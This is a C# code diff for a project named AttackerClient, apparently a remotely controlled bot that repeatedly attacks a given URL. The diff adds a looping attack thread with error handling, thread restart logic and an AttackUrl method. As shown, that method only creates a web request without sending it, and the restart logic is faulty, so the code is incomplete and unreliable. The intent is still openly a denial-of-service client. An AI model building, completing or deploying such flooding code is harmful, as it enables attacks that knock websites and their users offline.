@@ -8,6 +8,7 @@ using System.Text;
 using System.Threading.Tasks;
 using PubnubApi;
 using System.Threading;
+using System.Net;
 
 namespace AttackerClient
 {
@@ -117,22 +118,43 @@ namespace AttackerClient
             {
                 trdAttack = new Thread(() =>
                 {
-                    int i = 0;
-                    while (true)
+                    try
                     {
-                        i++;
-
-                        if (i % 10000 == 0)
+                        int i = 0;
+                        while (true)
                         {
-                            WriteMessage("Attacking: " + i.ToString());
-                            WriteMessage("Url: " + url);
+                            i++;
+
+                            if (i % 10000 == 0)
+                            {
+                                WriteMessage("Attacking: " + i.ToString());
+                                WriteMessage("Url: " + url);
+                                AttackUrl(url);
+                            }
                         }
+                    }
+                    catch (Exception ee)
+                    {
+                        WriteMessage("Error: " + ee.Message);
                     }
                 });
                 trdAttack.Start();
             }
+            else if (!trdAttack.IsAlive)
+            {
+                trdAttack.Start();
+            }
 
             WriteMessage("Attacking started to " + url);
+        }
+
+        /// <summary>
+        /// Saldırı yaparr
+        /// </summary>
+        /// <param name="uri"></param>
+        private static void AttackUrl(string uri)
+        {
+            WebRequest webRequest = HttpWebRequest.Create(uri);
         }
 
         /// <summary>
@@ -144,7 +166,7 @@ namespace AttackerClient
             Status = ClientStatusType.Normal;
             Data = String.Empty;
 
-            if(trdAttack != null)
+            if (trdAttack != null)
             {
                 trdAttack.Abort();
                 trdAttack = null;
